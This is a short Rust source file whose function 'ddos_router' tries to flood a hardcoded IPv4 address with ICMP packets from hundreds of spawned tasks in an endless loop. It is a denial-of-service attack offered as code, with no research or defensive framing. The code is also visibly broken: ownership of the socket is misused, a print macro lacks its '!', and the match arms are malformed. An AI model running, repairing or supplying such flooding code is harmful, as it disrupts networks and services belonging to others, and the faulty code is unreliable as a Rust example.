use icmp;
use std::net::{IpAddr, Ipv4Addr};

#[tokio::main]
async fn ddos_router(){
    let number_of_thread: u32 = 200;
    let target_ipv4 = IpAddr::V4(Ipv4Addr::new(82, 0, 128, 210));
    let connection = icmp::IcmpSocket::connect(target_ipv4);
    let mut connection = connection.unwrap();

    let false_payload: &[u8] = &[10];
loop{
    for j in 0..number_of_thread{
        tokio::spawn(async move {
        let request = connection.send(false_payload).await;
        match request{
            Ok => println!("request succeeded"),
            Error => println("request failed")
        }
        std::thread::sleep(std::time::Duration::from_millis(70));
        });
    }
}
}